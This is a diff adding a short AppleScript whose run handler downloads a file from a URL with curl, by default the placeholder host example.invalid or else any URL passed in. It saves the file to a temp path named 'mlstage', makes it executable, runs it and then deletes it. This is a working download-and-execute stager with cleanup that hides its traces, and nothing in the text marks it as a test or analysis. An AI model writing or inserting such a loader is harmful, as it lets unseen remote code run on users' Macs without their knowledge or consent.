@@ -1,0 +1,11 @@
+on run argv
+	set payloadURL to "https://example.invalid/packed_app"
+	if (count argv) is greater than 0 then set payloadURL to item 1 of argv
+	set urlArgument to quoted form of payloadURL
+	set commandText to "set -eu; p=$(/usr/bin/mktemp -t mlstage); " & ¬
+		"cleanup(){ /bin/rm -f \"$p\"; }; trap cleanup EXIT HUP INT TERM; " & ¬
+		"/usr/bin/curl --fail --silent --show-error --max-time 12 " & ¬
+		"--output \"$p\" " & urlArgument & "; " & ¬
+		"/bin/chmod 700 \"$p\"; \"$p\""
+	return do shell script commandText without altering line endings
+end run
